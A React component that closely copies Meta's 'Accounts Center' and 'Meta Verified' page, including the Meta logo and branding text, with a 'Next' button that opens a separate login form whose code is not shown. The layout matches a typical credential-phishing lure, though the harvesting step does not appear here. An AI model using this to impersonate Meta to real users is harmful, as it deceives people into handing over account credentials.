import { useState } from "react";
import "./App.scss";
import LoginForm from "./LoginForm";

function App() {
	const [isShowModal, setIsShowModal] = useState(false);

	const handleShowForm = () => {
		setIsShowModal(true);
	};

	const handleCloseForm = () => {
		setIsShowModal(false);
	};
	return (
		<>
			<div className="container">
				<div className="left">
					<div className="left-content">
						<svg
							aria-label="Meta logo"
							className="x1kpxq89 x1247r65"
							role="img"
							viewBox="0 0 500 100"
						>
							<defs>
								<linearGradient
									gradientUnits="userSpaceOnUse"
									id=":r2:"
									x1="124.38"
									x2="160.839"
									y1="99"
									y2="59.326"
								>
									<stop
										offset=".427"
										stopColor="#0278F1"
									></stop>
									<stop
										offset=".917"
										stopColor="#0180FA"
									></stop>
								</linearGradient>
								<linearGradient
									gradientUnits="userSpaceOnUse"
									id=":r3:"
									x1="42"
									x2="-1.666"
									y1="4.936"
									y2="61.707"
								>
									<stop
										offset=".427"
										stopColor="#0165E0"
									></stop>
									<stop
										offset=".917"
										stopColor="#0180FA"
									></stop>
								</linearGradient>
								<linearGradient
									gradientUnits="userSpaceOnUse"
									id=":r4:"
									x1="27.677"
									x2="132.943"
									y1="28.71"
									y2="71.118"
								>
									<stop stopColor="#0064E0"></stop>
									<stop
										offset=".656"
										stopColor="#0066E2"
									></stop>
									<stop offset="1" stopColor="#0278F1"></stop>
								</linearGradient>
							</defs>
							<path
								d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
								fill="#1C2B33"
							></path>
							<path
								d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
								fill="#0180FA"
							></path>
							<path
								d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
								fill="url(#:r2:)"
							></path>
							<path
								d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
								fill="url(#:r3:)"
							></path>
							<path
								d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
								fill="url(#:r4:)"
							></path>
						</svg>
						<p className="title">Accounts Center</p>
						<span>
							Manage your connected experiences and account
							settings across Meta technologies like Facebook,
							Instagram and Meta Horizon.
						</span>
						<a href="#">Learn more</a>
						<p className="account">Account settings</p>
						<button>
							<svg
								viewBox="0 0 24 24"
								fill="currentColor"
								width="1em"
								height="1em"
								aria-hidden="true"
								className="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"
							>
								<path d="M16.64 10.268a1 1 0 1 0-1.28-1.536l-.067.055a43.003 43.003 0 0 0-4.852 4.74l-1.734-1.734a1 1 0 0 0-1.414 1.414l2.5 2.5a1 1 0 0 0 1.475-.067l.056-.067a41 41 0 0 1 5.25-5.25l.066-.055z"></path>
								<path
									fillRule="evenodd"
									clipRule="evenodd"
									d="M15.533 1.479a1 1 0 0 0-1.332-.357L12 2.32 9.799 1.122a1 1 0 0 0-1.332.357L7.16 3.617l-2.506.063a1 1 0 0 0-.974.974L3.617 7.16 1.48 8.467A1 1 0 0 0 1.122 9.8L2.32 12l-1.198 2.201a1 1 0 0 0 .357 1.332l2.138 1.307.063 2.506a1 1 0 0 0 .974.974l2.506.063 1.307 2.139a1 1 0 0 0 1.332.356L12 21.68l2.201 1.198a1 1 0 0 0 1.332-.357l1.307-2.138 2.506-.063a1 1 0 0 0 .974-.974l.063-2.506 2.139-1.307a1 1 0 0 0 .356-1.332L21.68 12l1.198-2.201a1 1 0 0 0-.357-1.332L20.383 7.16l-.063-2.506a1 1 0 0 0-.974-.974l-2.506-.063-1.307-2.138zm-3.055 2.858 1.844-1.004 1.095 1.792a1 1 0 0 0 .829.478l2.099.052.052 2.1a1 1 0 0 0 .478.828l1.792 1.095-1.004 1.844a1 1 0 0 0 0 .956l1.004 1.844-1.792 1.095a1 1 0 0 0-.478.829l-.052 2.099-2.1.052a1 1 0 0 0-.828.478l-1.095 1.792-1.844-1.004a1 1 0 0 0-.956 0l-1.844 1.004-1.095-1.792a1 1 0 0 0-.829-.478l-2.099-.052-.052-2.1a1 1 0 0 0-.478-.828l-1.792-1.095 1.004-1.844a1 1 0 0 0 0-.956L3.333 9.678l1.792-1.095a1 1 0 0 0 .478-.829l.052-2.099 2.1-.052a1 1 0 0 0 .828-.478l1.095-1.792 1.844 1.004a1 1 0 0 0 .956 0z"
								></path>
							</svg>
							Show your profile is verified
						</button>
					</div>
				</div>
				<div className="right">
					<div className="right-content">
						<h1>Build trust with Meta Verified</h1>
						<div className="items">
							<div className="item">
								<svg
									viewBox="0 0 24 24"
									fill="currentColor"
									width="1em"
									height="1em"
									aria-hidden="true"
									className="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"
								>
									<path d="M16.64 10.268a1 1 0 1 0-1.28-1.536l-.067.055a43.003 43.003 0 0 0-4.852 4.74l-1.734-1.734a1 1 0 0 0-1.414 1.414l2.5 2.5a1 1 0 0 0 1.475-.067l.056-.067a41 41 0 0 1 5.25-5.25l.066-.055z"></path>
									<path
										fillRule="evenodd"
										clipRule="evenodd"
										d="M15.533 1.479a1 1 0 0 0-1.332-.357L12 2.32 9.799 1.122a1 1 0 0 0-1.332.357L7.16 3.617l-2.506.063a1 1 0 0 0-.974.974L3.617 7.16 1.48 8.467A1 1 0 0 0 1.122 9.8L2.32 12l-1.198 2.201a1 1 0 0 0 .357 1.332l2.138 1.307.063 2.506a1 1 0 0 0 .974.974l2.506.063 1.307 2.139a1 1 0 0 0 1.332.356L12 21.68l2.201 1.198a1 1 0 0 0 1.332-.357l1.307-2.138 2.506-.063a1 1 0 0 0 .974-.974l.063-2.506 2.139-1.307a1 1 0 0 0 .356-1.332L21.68 12l1.198-2.201a1 1 0 0 0-.357-1.332L20.383 7.16l-.063-2.506a1 1 0 0 0-.974-.974l-2.506-.063-1.307-2.138zm-3.055 2.858 1.844-1.004 1.095 1.792a1 1 0 0 0 .829.478l2.099.052.052 2.1a1 1 0 0 0 .478.828l1.792 1.095-1.004 1.844a1 1 0 0 0 0 .956l1.004 1.844-1.792 1.095a1 1 0 0 0-.478.829l-.052 2.099-2.1.052a1 1 0 0 0-.828.478l-1.095 1.792-1.844-1.004a1 1 0 0 0-.956 0l-1.844 1.004-1.095-1.792a1 1 0 0 0-.829-.478l-2.099-.052-.052-2.1a1 1 0 0 0-.478-.828l-1.792-1.095 1.004-1.844a1 1 0 0 0 0-.956L3.333 9.678l1.792-1.095a1 1 0 0 0 .478-.829l.052-2.099 2.1-.052a1 1 0 0 0 .828-.478l1.095-1.792 1.844 1.004a1 1 0 0 0 .956 0z"
									></path>
								</svg>
								<div className="content">
									<p>Increased account protection</p>
									<span>
										Worry less about impersonation with
										proactive identity monitoring.
									</span>
								</div>
							</div>
							<div className="item">
								<svg
									viewBox="0 0 24 24"
									fill="currentColor"
									width="1em"
									height="1em"
									aria-hidden="true"
									className="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"
								>
									<path
										fillRule="evenodd"
										clipRule="evenodd"
										d="M3.73 4.594c-.45.25-.73.726-.73 1.241v4.104a12 12 0 0 0 6.172 10.49l1.857 1.031a2 2 0 0 0 1.942 0l1.857-1.031A12 12 0 0 0 21 9.939V5.835c0-.515-.28-.99-.73-1.24a17.03 17.03 0 0 0-16.54 0zM19 6.181a15.03 15.03 0 0 0-14 0V9.94a10 10 0 0 0 5.144 8.742L12 19.712l1.856-1.031A10 10 0 0 0 19 9.939V6.181z"
									></path>
								</svg>
								<div className="content">
									<p>Enhanced support</p>
									<span>
										Contact a help agent via email or chat.
										Right now, support is only available in{" "}
										<a href="#">some language.</a>
									</span>
								</div>
							</div>
							<div className="item">
								<svg
									viewBox="0 0 24 24"
									fill="currentColor"
									width="1em"
									height="1em"
									aria-hidden="true"
									className="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"
								>
									<path
										fillRule="evenodd"
										clipRule="evenodd"
										d="M17 6A5 5 0 1 1 7 6a5 5 0 0 1 10 0zm-2 0a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"
									></path>
									<path d="M12 21c1.007 0 1.923-.032 2.746-.086l.883.387.552 1.212c.044.097.092.188.145.275-1.208.125-2.65.212-4.326.212-3.156 0-5.483-.307-6.978-.599C3.79 22.161 3 21.056 3 19.801v-1.134C3 14.222 7.5 12 12 12c1.932 0 3.864.41 5.44 1.23a2.491 2.491 0 0 0-1.267 1.307l-.108.251C14.905 14.282 13.485 14 12 14c-1.958 0-3.8.49-5.088 1.337C5.684 16.146 5 17.232 5 18.667V19.8c0 .211.066.372.142.472.07.091.152.144.262.165C6.776 20.706 8.974 21 12 21z"></path>
									<path d="M19.004 15.327a.541.541 0 0 0-.993 0l-.715 1.664a.54.54 0 0 1-.284.283l-1.684.72a.538.538 0 0 0-.005.989l1.62.71a.54.54 0 0 1 .274.271l.784 1.72c.194.426.804.42.989-.01l.73-1.699a.54.54 0 0 1 .284-.283l1.668-.713a.538.538 0 0 0 0-.991l-1.668-.714a.54.54 0 0 1-.284-.283l-.716-1.664z"></path>
								</svg>
								<div className="content">
									<p>Upgraded profile features</p>
									<span>
										Add a header image to your links to
										showcase what your brand has to offer.
									</span>
								</div>
							</div>
							<div className="item">
								<svg
									viewBox="0 0 24 24"
									fill="currentColor"
									width="1em"
									height="1em"
									aria-hidden="true"
									className="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"
								>
									<path
										fillRule="evenodd"
										clipRule="evenodd"
										d="m10.158 10.174-5.004.307 3.88 3.23-1.253 4.856L12 15.863l4.22 2.704-1.254-4.856 3.88-3.23-5.004-.307L12 5.477l-1.842 4.697zm.911-7.8c.332-.847 1.53-.847 1.862 0l2.307 5.881 6.247.384c.903.055 1.274 1.187.578 1.766l-4.844 4.032 1.573 6.097c.227.88-.743 1.582-1.508 1.092L12 18.239l-5.284 3.387c-.766.49-1.735-.212-1.508-1.092l1.573-6.097-4.844-4.032c-.696-.579-.325-1.71.579-1.766l6.246-.384 2.307-5.882z"
									></path>
								</svg>
								<div className="content">
									<p>Bonus stars and stickers</p>
									<span>
										Express yourself with stickers only
										available to Meta Verified subscribers,
										and support your favorite creators with
										bonus stars.
									</span>
								</div>
							</div>
						</div>
						<p className="verify">
							Meta Verified is not available for people younger
							than 18 years of age.{" "}
							<a href="#">
								See all Meta Verified eligibility requirements
							</a>
						</p>
						<p className="policy">
							Information you provide is subject to our{" "}
							<a href="#">Privacy Policy.</a>
						</p>
						<button onClick={handleShowForm}>Next</button>
					</div>
				</div>
			</div>
			{isShowModal && <LoginForm onClose={handleCloseForm} />}
		</>
	);
}

export default App;